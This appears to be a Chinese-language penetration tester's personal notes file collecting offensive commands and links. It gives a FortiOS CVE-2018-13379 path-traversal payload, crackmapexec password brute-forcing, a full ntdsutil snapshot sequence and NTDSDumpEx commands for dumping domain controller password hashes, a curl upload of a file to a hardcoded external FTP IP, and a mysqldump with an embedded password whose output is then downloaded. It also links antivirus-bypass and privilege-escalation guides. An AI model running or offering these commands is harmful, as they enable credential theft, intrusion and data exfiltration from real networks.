# -Infiltration-summary
*平时工作总结*

navicat连接本地mysql数据库
ALTER USER 'root'@'localhost' IDENTIFIED BY 'password' PASSWORD EXPIRE NEVER;
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';

远控学习：https://github.com/TideSec/BypassAntiVirus 轻型目录访问协议（英文：Lightweight Directory Access Protocol，缩写：LDAP)是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。

CVE-2021-21972 https://mp.weixin.qq.com/s/0VZzc0gYBrGIeuu1-QCFag

https://www.freebuf.com/articles/web/264345.html fofa搜索title="+ ID_VC_Welcome +"

https://blog.csdn.net/cxrpty/article/details/104807306 mysql UDF提权

https://scarletf.github.io/2019/09/03/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%AF%BC%E5%87%BA%E5%9F%9F%E7%94%A8%E6%88%B7Hash%E6%96%B9%E6%B3%95/

MantisBT是一个开源问题跟踪器，可在简单性和功能之间实现微妙的平衡。

sudo apt-get install openjdk-8-jdk 升级jdk

Fortinet FortiOS路径遍历漏洞 CVE-2018-13379 /remote/fgt_lang?lang=/../../../../../../..///////////dev/cmdb/sslvpn_websession https://github.com/cckuailong/PocCollect/commit/f22ca95309392e2c12cf6b501aa31b5f6e57339c

https://www.advanced-port-scanner.com/ 端口扫描

net use \10.10.10.201\ipc$ P@ssw0rd /user:localhost\administrator

Symantec 赛门铁克是一家总部设于美国加利福尼亚州山景城的互联网安全技术厂商

crackmapexec 10.10.10.201 -u Administrator -p P@ssw0rd -x "ipconfig /all" crackmapexec.exe ip.txt -u user.txt -p pass.txt -t 3 -x "ipconfig /all" >>a.txt 爆破命令

域控制器抓取域成员hash（2008,2012，2016） ntdsutil snapshot "list all" quit quit //查看全部快照 ntdsutil snapshot "activate instance ntds" create quit quit //创建快照 ntdsutil snapshot "list all" quit quit //查看全部快照 ntdsutil snapshot "mount {d39bd9ed-5474-4929-8273-e8c82cc662af}" quit quit //挂载快照为文件夹 copy C:$SNAP_201706301256_VOLUMEC$\windows\ntds\ntds.dit //拷贝快照文件夹中hash存储文件 ntdsutil snapshot "unmount {150a1e86-84f0-41c4-816c-13d03356de0d}" quit quit //卸载快照 ntdsutil snapshot "delete {98eee20e-86ba-4ac2-acc4-f835d80d1d63}" quit quit //删除快照 "C:\Program Files\7-Zip\7z.exe" a ntds.7z C:\windows\system32\ntds.dit //压缩hash存储文件+

如何从 ntds.dit 提取 Hash NTDSDumpEx

离线模式：先导出注册表
reg save hklm\system system.hiv NTDSDumpEx.exe -d ntds.dit -s system.hiv -o hash.txt

在线模式：无需导出注册表
NTDSDumpEx.exe -d ntds.dit -r -o hash.txt

curl -T app.jar ftp://185.243.41.216/

mysqldump -uroot -pfda4da7295f11da1 --databases guess >/tmp/guess.sql mv /tmp/guess.sql 下载回来文件 curl -o guess.sql https://www/妈的目录/guess.sql
